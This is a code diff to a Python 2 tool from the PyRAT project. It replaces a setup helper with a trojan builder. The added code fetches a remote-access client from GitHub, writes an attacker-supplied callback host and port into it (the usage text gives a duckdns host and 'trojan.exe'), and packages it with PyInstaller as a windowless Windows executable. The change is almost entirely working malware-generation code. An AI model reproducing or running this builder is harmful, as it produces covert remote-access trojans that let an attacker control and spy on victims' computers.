@@ -6,59 +6,66 @@
 __author__ = "Black Viking"
 __date__   = "15.04.2017"
 
-import os, sys, pip, subprocess
+import sys, os, subprocess, urllib2, colorama, shutil
 
-dirs = os.listdir(os.getcwd())
-
-def installModule(module):
-	pip.main(['install', module])
-	print "=" * 60
-
-def main():
-	try:
-		import mss
-	except ImportError:
-		 if raw_input("[!] Mss module not found. Do you want install it?[Y/n] --> ").lower() == "y":
-		 	installModule("mss")
-		 else:
-		 	sys.exit()
-
-	try:
-		import colorama
-	except ImportError:
-		 if raw_input("[!] Colorama module not found. Do you want install it?[Y/n] --> ").lower() == "y":
-		 	installModule("colorama")
-		 else:
-		 	sys.exit()
-
-	if "pyinstaller.exe" not in os.listdir(sys.exec_prefix + os.sep + "Scripts"):
-		 if raw_input("[!] PyInstaller module not found. Do you want install it?[Y/n] --> ").lower() == "y":
-		 	installModule("pyinstaller")
-		 else:
-		 	sys.exit()
-
-	else:
-		pass
-
-	if "downloads" not in dirs:
-		os.mkdir("downloads")
-		print "[~] Directory created ==> 'downloads'"
-	else:
-		pass
-
-	if "screenshots" not in dirs:
-		os.mkdir("screenshots")
-		print "[~] Directory created ==> 'screenshots'"
-
-	else:
-		pass
-
-	if "executables" not in dirs:
-		os.mkdir("executables")
-		print "[~] Directory created ==> 'executables'"
-
-	subprocess.Popen([sys.executable, 'PyRAT.py'], creationflags=subprocess.CREATE_NEW_CONSOLE)
+def usage():
+	print """
+Usage:
+----------------------
+	python2 generate_exec.py 127.0.0.1 8080 trojan.exe
+	---
+	python2 generate_exec.py vkng.duckdns.org 1604 trojan.exe\n"""
 	sys.exit()
 
+def get_client(host, port):
+	return urllib2.urlopen("https://raw.githubusercontent.com/blackvkng/PyRAT/master/source/client.py").read().replace("HOST = '127.0.0.1'", "HOST = socket.gethostbyname('%s')"%(host)).replace("PORT = int('8000')", "PORT = int('%s')"%(port))
+
+	
+def generate_exec(host, port, source, name):
+	print """
+[-] Host: %s
+[-] Port: %s
+[-] Name: %s"""%(host, port, name)
+	
+	file = open(name.split(".")[0], "w")
+	file.write(source)
+	file.close()
+
+	#cmd = "pyinstaller --onefile --noconsole %s"%(name.split(".")[0])
+	cmd = subprocess.Popen(['pyinstaller', "--onefile", '--noconsole', name.split(".")[0]], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
+	stdout, nothing = cmd.communicate()    
+	file = "%s%sdist%s%s"%(os.getcwd(), os.sep, os.sep, name)
+	if os.path.exists(file) == True:
+		os.chdir("..")
+		shutil.copy2(file, "executables/"+name)
+		shutil.rmtree("exec")
+		print "\n[+] Exe file (Windows) ==> %s"%(os.path.abspath(os.path.join(os.getcwd(), os.pardir))
++os.sep+"executables(Windows)"+os.sep+name)
+	else:
+		sys.exit()
+
+def main():
+	if len(sys.argv) == 4:
+		if os.path.exists("exec") == True:
+			os.chdir("exec")
+		else:
+			os.mkdir("exec")
+			os.chdir("exec")
+
+		host = sys.argv[1]	
+		port = sys.argv[2]
+		name = sys.argv[3]
+		
+		source = get_client(host, port)
+
+		generate_exec(host, port, source, name)
+
+	else:
+		usage()
+
 if __name__ == "__main__":
-	main()
+	try:
+		main()
+	except Exception as e:
+		print "[!] Error: %s"%(e)
+	raw_input("\n[~] Press enter to exit...")
